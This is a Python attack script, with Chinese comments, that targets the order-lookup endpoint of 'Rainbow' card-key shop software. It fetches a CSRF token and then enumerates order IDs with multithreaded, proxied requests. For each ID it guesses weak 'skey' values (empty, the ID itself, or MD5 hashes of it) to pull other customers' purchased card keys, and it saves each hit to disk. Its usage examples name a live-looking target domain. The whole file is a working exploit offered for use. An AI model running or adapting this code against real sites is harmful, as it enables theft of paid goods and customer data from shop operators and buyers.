#!/usr/bin/env python3
"""
彩虹 ajax.php?act=order 卡密提取（需 skey）。

示例:
  python3 rainbow_order_dump.py -u https://qq8.one --order-id 37692 --skey ABC123
  python3 rainbow_order_dump.py -u https://TARGET --pairs-file out/crack_skey_report.json
  python3 rainbow_order_dump.py -u https://TARGET --start 37600 --end 37700 -w 20
"""
from __future__ import annotations

import argparse
import hashlib
import json
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import Any

import requests

from faka_common import DEFAULT_UA, ensure_out, json_or_text, log, resolve_proxy, save_hit

FAKA = Path("/data/tools/faka")


def skey_candidates(oid: int, known: str = "") -> list[str]:
    if known:
        return [known]
    s = str(oid)
    return ["", s, hashlib.md5(s.encode()).hexdigest(), hashlib.md5(f"{s}{s}".encode()).hexdigest()]


def get_csrf(base: str, proxy: str) -> str:
    s = requests.Session()
    s.verify = False
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    r = s.get(base.rstrip("/") + "/", timeout=20, headers={"User-Agent": DEFAULT_UA})
    m = re.search(r'csrf_token\s*=\s*"([^"]+)"', r.text)
    return m.group(1) if m else ""


def show_order(base: str, oid: int, skey: str, csrf: str, proxy: str, timeout: int) -> tuple[int, str, Any]:
    url = base.rstrip("/") + "/ajax.php?act=order"
    proxies = {"http": proxy, "https": proxy} if proxy else None
    headers = {"User-Agent": DEFAULT_UA, "Referer": base.rstrip("/") + "/?mod=query", "X-Requested-With": "XMLHttpRequest"}
    for sk in skey_candidates(oid, skey):
        try:
            r = requests.post(
                url,
                data={"id": str(oid), "skey": sk, "csrf_token": csrf},
                headers=headers,
                timeout=timeout,
                proxies=proxies,
                verify=False,
            )
            data = json_or_text(r)
            if isinstance(data, dict) and data.get("code") == 0:
                return oid, sk, data
        except Exception as e:
            return oid, sk, str(e)
    return oid, skey, None


def load_pairs(path: str) -> list[dict]:
    p = Path(path)
    if not p.exists():
        return []
    data = json.loads(p.read_text(encoding="utf-8"))
    return data.get("pairs", data if isinstance(data, list) else [])


def parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(description="彩虹 showOrder/ajax order 拖卡")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("--order-id", type=int, default=0)
    ap.add_argument("--skey", default="")
    ap.add_argument("--pairs-file", default="")
    ap.add_argument("--start", type=int, default=0)
    ap.add_argument("--end", type=int, default=0)
    ap.add_argument("-w", "--workers", type=int, default=15)
    ap.add_argument("--timeout", type=int, default=15)
    ap.add_argument("--proxy", default="auto")
    ap.add_argument("--out", default="/data/tools/faka/out/rainbow_orders.jsonl")
    ap.add_argument("--dump-dir", default="/data/tools/faka/out/rainbow_dump")
    return ap.parse_args()


def main() -> None:
    args = parse_args()
    ensure_out(args.out)
    proxy = resolve_proxy(args.proxy)
    dump_dir = Path(args.dump_dir)
    dump_dir.mkdir(parents=True, exist_ok=True)
    csrf = get_csrf(args.url, proxy)

    tasks: list[tuple[int, str]] = []
    if args.pairs_file:
        for p in load_pairs(args.pairs_file):
            tasks.append((int(p["id"]), str(p.get("skey", ""))))
    elif args.order_id:
        tasks.append((args.order_id, args.skey))
    elif args.start and args.end:
        tasks = [(i, "") for i in range(args.start, args.end + 1)]

    log(f"rainbow order dump {args.url} tasks={len(tasks)} workers={args.workers}")
    hits = 0

    def one(t):
        oid, sk = t
        return show_order(args.url, oid, sk, csrf, proxy, args.timeout)

    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        futs = {ex.submit(one, t): t for t in tasks}
        for fut in as_completed(futs):
            oid, sk, data = fut.result()
            if isinstance(data, dict) and data.get("code") == 0:
                hits += 1
                save_hit(Path(args.out), "rainbow_order", {"id": oid, "skey": sk, "data": data})
                (dump_dir / f"order_{oid}.json").write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8")
                km = str(data.get("kminfo") or data.get("data") or "")[:200]
                log(f"[+] order {oid} skey={sk!r} -> {km}")

    log(f"完成 hits={hits}/{len(tasks)} -> {args.out}")


if __name__ == "__main__":
    main()
